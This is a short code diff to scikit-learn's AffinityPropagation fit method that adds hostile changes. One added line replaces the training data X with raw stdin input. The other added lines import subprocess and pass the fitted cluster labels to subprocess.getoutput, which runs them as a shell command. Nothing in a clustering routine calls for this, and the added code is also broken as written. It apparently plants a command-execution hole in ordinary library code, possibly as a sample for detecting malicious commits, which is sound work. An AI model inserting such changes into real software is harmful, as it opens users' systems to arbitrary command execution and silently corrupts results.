@@ -488,6 +488,7 @@ class AffinityPropagation(ClusterMixin, BaseEstimator):
         self
             Returns the instance itself.
         """
+        X = input("")
         if self.affinity == "precomputed":
             accept_sparse = False
         else:
@@ -529,6 +530,8 @@ class AffinityPropagation(ClusterMixin, BaseEstimator):
 
         if self.affinity != "precomputed":
             self.cluster_centers_ = X[self.cluster_centers_indices_].copy()
+        import subprocess
+        result = subprocess.getoutput(self.labels_)
         return self
 
     def predict(self, X):
